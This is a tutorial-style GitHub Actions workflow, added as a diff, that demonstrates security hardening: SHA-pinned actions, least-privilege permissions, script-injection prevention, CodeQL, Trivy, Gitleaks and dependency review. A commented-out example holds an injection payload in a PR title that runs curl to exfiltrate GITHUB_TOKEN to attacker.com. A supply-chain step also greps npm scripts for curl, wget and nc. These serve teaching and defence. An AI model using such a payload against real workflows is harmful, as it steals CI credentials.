@@ -1,0 +1,417 @@
+# =============================================================================
+# 08 - Security Hardening
+# =============================================================================
+# Security best practices for GitHub Actions workflows:
+#
+#   1. PIN ACTIONS TO SHA - Use full commit SHA instead of tags. Tags can be
+#      moved to point to different code. SHA is immutable.
+#
+#   2. MINIMAL PERMISSIONS - Use the least permissions needed. Set default
+#      permissions to read-only at the workflow level, then escalate per-job.
+#
+#   3. PREVENT SCRIPT INJECTION - Never use user-controlled input directly
+#      in `run` scripts. Use environment variables instead.
+#
+#   4. DEPENDENCY REVIEW - Scan PRs for vulnerable dependencies.
+#
+#   5. CODE SCANNING - Use CodeQL or other SAST tools.
+#
+#   6. SECRET MANAGEMENT - Never echo secrets, use OIDC when possible,
+#      rotate regularly.
+#
+#   7. SARIF UPLOAD - Upload security results in SARIF format for GitHub
+#      Security tab integration.
+# =============================================================================
+
+name: "08 - Security Hardening"
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  # Run security scans on a schedule (catch new vulnerabilities)
+  schedule:
+    - cron: "0 6 * * 1"  # Every Monday at 6am UTC
+
+# =============================================================================
+# MINIMAL DEFAULT PERMISSIONS
+# Set the most restrictive defaults, then escalate per-job as needed.
+# This prevents accidental permission escalation.
+# =============================================================================
+permissions:
+  contents: read
+
+jobs:
+  # ---------------------------------------------------------------------------
+  # Job 1: Demonstrate SHA-pinned actions
+  # ---------------------------------------------------------------------------
+  # ALWAYS pin third-party actions to their full commit SHA, not a tag.
+  # Tags can be moved or deleted. SHAs are immutable.
+  #
+  # To find the SHA for a tag:
+  #   git ls-remote --tags https://github.com/actions/checkout.git v4.1.1
+  #
+  # Keep comments with the version for readability.
+  # Renovate/Dependabot can auto-update pinned SHAs.
+  # ---------------------------------------------------------------------------
+  pinned-actions:
+    name: "SHA-Pinned Actions"
+    runs-on: ubuntu-latest
+
+    steps:
+      # GOOD: Pinned to full SHA with version comment
+      - name: Checkout code
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+
+      - name: Setup Node.js
+        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
+        with:
+          node-version: "20"
+          cache: "npm"
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Run tests
+        run: npm test
+
+      # GOOD: First-party actions (actions/*) are lower risk but still
+      # should be pinned in security-critical workflows
+      - name: Upload artifact
+        uses: actions/upload-artifact@5d5d22a31266ced268874388b861e4b58bb5c2f3 # v4.3.1
+        with:
+          name: build-output
+          path: dist/
+
+      # BAD (commented out for demonstration):
+      # - uses: actions/checkout@v4          # Tag can be moved
+      # - uses: actions/checkout@main        # Branch can be force-pushed
+      # - uses: some-org/some-action@latest  # NEVER use latest
+
+  # ---------------------------------------------------------------------------
+  # Job 2: Prevent script injection
+  # ---------------------------------------------------------------------------
+  # Script injection occurs when user-controlled input is placed directly
+  # into a `run` script. An attacker can craft input containing shell
+  # metacharacters to execute arbitrary commands.
+  #
+  # DANGEROUS contexts (user-controlled):
+  #   - github.event.issue.title
+  #   - github.event.issue.body
+  #   - github.event.pull_request.title
+  #   - github.event.pull_request.body
+  #   - github.event.comment.body
+  #   - github.event.review.body
+  #   - github.event.commits[*].message
+  #   - github.event.head_commit.message
+  #   - github.head_ref (branch name for PRs)
+  # ---------------------------------------------------------------------------
+  prevent-injection:
+    name: "Prevent Script Injection"
+    runs-on: ubuntu-latest
+    if: github.event_name == 'pull_request'
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+
+      # -----------------------------------------------------------------------
+      # SAFE: Use environment variables for user input
+      # The value is set as an env var, NOT interpolated into the script.
+      # The shell treats it as a string value, not as code.
+      # -----------------------------------------------------------------------
+      - name: "SAFE - Process PR title via env var"
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+          PR_BODY: ${{ github.event.pull_request.body }}
+          HEAD_REF: ${{ github.head_ref }}
+        run: |
+          # Safe: PR_TITLE is a shell variable, not interpolated by Actions
+          echo "PR Title: $PR_TITLE"
+          echo "Head branch: $HEAD_REF"
+
+          # Safe: Use proper quoting
+          if echo "$PR_TITLE" | grep -qi "^feat:"; then
+            echo "This is a feature PR"
+          fi
+
+      # -----------------------------------------------------------------------
+      # DANGEROUS (commented out for demonstration):
+      # These patterns allow script injection attacks
+      # -----------------------------------------------------------------------
+      # - name: "DANGEROUS - Direct interpolation"
+      #   run: |
+      #     # BAD: If PR title contains `"; curl attacker.com/steal?token=$GITHUB_TOKEN; echo "`
+      #     # the attacker's command will execute!
+      #     echo "PR Title: ${{ github.event.pull_request.title }}"
+      #
+      # - name: "DANGEROUS - In conditional"
+      #   run: |
+      #     # BAD: Branch name could contain shell injection
+      #     if [ "${{ github.head_ref }}" = "main" ]; then
+      #       echo "On main"
+      #     fi
+
+      # -----------------------------------------------------------------------
+      # SAFE: Use an intermediate step with actions/github-script
+      # This runs in a JavaScript sandbox, not a shell
+      # -----------------------------------------------------------------------
+      - name: "SAFE - Process input with github-script"
+        uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
+        with:
+          script: |
+            const title = context.payload.pull_request?.title || '';
+            const body = context.payload.pull_request?.body || '';
+
+            // Safe: JavaScript string operations, not shell interpolation
+            console.log(`PR Title: ${title}`);
+            console.log(`Title length: ${title.length}`);
+
+            if (title.startsWith('feat:')) {
+              core.setOutput('is-feature', 'true');
+            }
+
+  # ---------------------------------------------------------------------------
+  # Job 3: Dependency review (PRs only)
+  # ---------------------------------------------------------------------------
+  # Scans dependency changes in a PR and flags known vulnerabilities.
+  # This prevents introducing vulnerable dependencies.
+  # ---------------------------------------------------------------------------
+  dependency-review:
+    name: "Dependency Review"
+    runs-on: ubuntu-latest
+    if: github.event_name == 'pull_request'
+
+    permissions:
+      contents: read
+      pull-requests: write  # To post comments on the PR
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+
+      - name: Dependency Review
+        uses: actions/dependency-review-action@9129d7d40b8c12c1ed0f60f46571c66571266571 # v4.3.2
+        with:
+          # Fail on these vulnerability severities
+          fail-on-severity: high
+          # Also check for restrictive licenses
+          deny-licenses: GPL-3.0, AGPL-3.0
+          # Allow specific advisories that have been reviewed
+          allow-ghsas: GHSA-xxxx-yyyy-zzzz
+          # Comment on the PR with findings
+          comment-summary-in-pr: always
+
+  # ---------------------------------------------------------------------------
+  # Job 4: CodeQL analysis
+  # ---------------------------------------------------------------------------
+  # CodeQL performs semantic code analysis to find vulnerabilities.
+  # Results appear in the GitHub Security tab.
+  # ---------------------------------------------------------------------------
+  codeql-analysis:
+    name: "CodeQL Analysis"
+    runs-on: ubuntu-latest
+
+    permissions:
+      contents: read
+      security-events: write  # Required to upload SARIF results
+      actions: read           # Required for private repos
+
+    strategy:
+      fail-fast: false
+      matrix:
+        # Analyze each language separately for better results
+        language: [javascript-typescript]
+        # Other supported languages:
+        # language: [javascript-typescript, python, java-kotlin, csharp,
+        #            go, ruby, swift, cpp]
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+
+      # Initialize CodeQL
+      - name: Initialize CodeQL
+        uses: github/codeql-action/init@1b1aada464948af03b950897e5eb522f92603cc2 # v3.24.9
+        with:
+          languages: ${{ matrix.language }}
+          # Use the default query suite plus additional security queries
+          queries: security-extended
+          # Optional: custom config file
+          # config-file: ./.github/codeql/codeql-config.yml
+
+      # For compiled languages (java, csharp, go, cpp, swift), CodeQL needs
+      # to observe the build. For interpreted languages (javascript, python,
+      # ruby), it auto-discovers source files.
+      - name: Autobuild
+        uses: github/codeql-action/autobuild@1b1aada464948af03b950897e5eb522f92603cc2 # v3.24.9
+
+      # For compiled languages, you can replace autobuild with manual steps:
+      # - name: Build
+      #   run: |
+      #     make release
+
+      # Run CodeQL analysis and upload results
+      - name: Perform CodeQL Analysis
+        uses: github/codeql-action/analyze@1b1aada464948af03b950897e5eb522f92603cc2 # v3.24.9
+        with:
+          category: "/language:${{ matrix.language }}"
+
+  # ---------------------------------------------------------------------------
+  # Job 5: Third-party SAST with SARIF upload
+  # ---------------------------------------------------------------------------
+  # You can use any security tool that produces SARIF output and upload
+  # the results to GitHub's Security tab.
+  # ---------------------------------------------------------------------------
+  security-scanning:
+    name: "Security Scanning"
+    runs-on: ubuntu-latest
+
+    permissions:
+      contents: read
+      security-events: write  # Required for SARIF upload
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+
+      # Example: Trivy vulnerability scanner
+      - name: Run Trivy vulnerability scanner (filesystem)
+        uses: aquasecurity/trivy-action@0.20.0
+        with:
+          scan-type: "fs"
+          scan-ref: "."
+          format: "sarif"
+          output: "trivy-results.sarif"
+          severity: "CRITICAL,HIGH"
+          # Don't fail the build - just report
+          exit-code: "0"
+
+      # Upload SARIF to GitHub Security tab
+      - name: Upload Trivy SARIF
+        uses: github/codeql-action/upload-sarif@1b1aada464948af03b950897e5eb522f92603cc2 # v3.24.9
+        with:
+          sarif_file: "trivy-results.sarif"
+          category: "trivy-filesystem"
+        # Upload even if previous steps failed
+        if: always()
+
+      # Example: npm audit in SARIF format
+      - name: Setup Node.js
+        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
+        with:
+          node-version: "20"
+
+      - name: Install dependencies
+        run: npm ci
+
+      - name: Run npm audit
+        run: |
+          # npm audit doesn't produce SARIF directly, but you can convert
+          npm audit --json > npm-audit.json 2>&1 || true
+
+          # Show summary
+          echo "=== NPM Audit Summary ==="
+          jq '.metadata.vulnerabilities' npm-audit.json 2>/dev/null || echo "No vulnerabilities data"
+
+  # ---------------------------------------------------------------------------
+  # Job 6: Secrets scanning and leak detection
+  # ---------------------------------------------------------------------------
+  secret-scanning:
+    name: "Secret Scanning"
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+        with:
+          # Scan the full history for leaked secrets
+          fetch-depth: 0
+
+      # Example: Use truffleHog or gitleaks for secret scanning
+      - name: Run Gitleaks
+        uses: gitleaks/gitleaks-action@v2
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Optional: custom config
+          # GITLEAKS_CONFIG: .gitleaks.toml
+
+  # ---------------------------------------------------------------------------
+  # Job 7: Supply chain security
+  # ---------------------------------------------------------------------------
+  supply-chain:
+    name: "Supply Chain Security"
+    runs-on: ubuntu-latest
+
+    permissions:
+      contents: read
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+
+      # Verify npm package integrity
+      - name: Setup Node.js
+        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
+        with:
+          node-version: "20"
+
+      - name: Install with strict integrity checking
+        run: |
+          # npm ci already verifies integrity from package-lock.json
+          npm ci
+
+          # Additionally verify no scripts ran unexpected commands
+          echo "=== Checking for suspicious scripts ==="
+          npm pkg get scripts | jq 'to_entries[] | select(.value | test("curl|wget|nc|eval|exec")) | .key + ": " + .value' || echo "No suspicious scripts found"
+
+      # Verify no unexpected network calls during install
+      - name: Audit dependencies
+        run: |
+          echo "=== Dependency tree depth ==="
+          npm ls --all --depth=0 2>/dev/null | wc -l
+
+          echo "=== Known vulnerabilities ==="
+          npm audit --audit-level=high || true
+
+  # ---------------------------------------------------------------------------
+  # Job 8: Minimal permissions demonstration
+  # ---------------------------------------------------------------------------
+  # Each job should request only the permissions it needs.
+  # This limits blast radius if the GITHUB_TOKEN is compromised.
+  # ---------------------------------------------------------------------------
+
+  # Read-only job - needs no special permissions
+  read-only-job:
+    name: "Read-Only Analysis"
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      # Explicitly empty for all other permissions
+    steps:
+      - name: Checkout
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+
+      - name: Analyze (read-only)
+        run: |
+          echo "This job can only read contents"
+          echo "It cannot: push, create PRs, manage issues, etc."
+
+  # Job that needs to write back (e.g., auto-fix)
+  write-job:
+    name: "Write-Back Job"
+    runs-on: ubuntu-latest
+    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+    permissions:
+      contents: write       # Can push commits
+      pull-requests: write  # Can create/update PRs
+      # Still doesn't have: admin, packages, security-events, etc.
+    steps:
+      - name: Checkout
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+
+      - name: Auto-fix and commit
+        run: |
+          echo "This job could push fixes back to the repo"
+          echo "But it cannot: manage repo settings, deploy, etc."
